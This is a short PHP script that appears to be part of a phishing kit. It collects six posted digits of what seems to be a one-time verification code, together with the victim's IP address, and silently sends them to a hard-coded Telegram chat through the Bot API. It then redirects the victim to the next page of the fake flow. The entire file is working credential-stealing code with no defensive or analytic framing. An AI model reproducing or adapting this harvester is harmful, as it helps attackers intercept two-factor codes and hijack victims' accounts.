<?php

@session_start();
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];


if ( isset ($_POST['c1']) && isset ($_POST['c2']) && isset ($_POST['c3']) && isset ($_POST['c4']) && isset ($_POST['c5']) && isset ($_POST['c6']) ){

$message = "Cod2.: ".$_POST['c1']."".$_POST['c2']."".$_POST['c3']."".$_POST['c4']."".$_POST['c5']."".$_POST['c6']." ".$userp."\r\n";

$apiToken = "<TOKEN_REMOVED>";


$data = [
  'chat_id' => '2124940397',

   'text' => $message
];


$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
Header ("Location: step1.html");
}
?>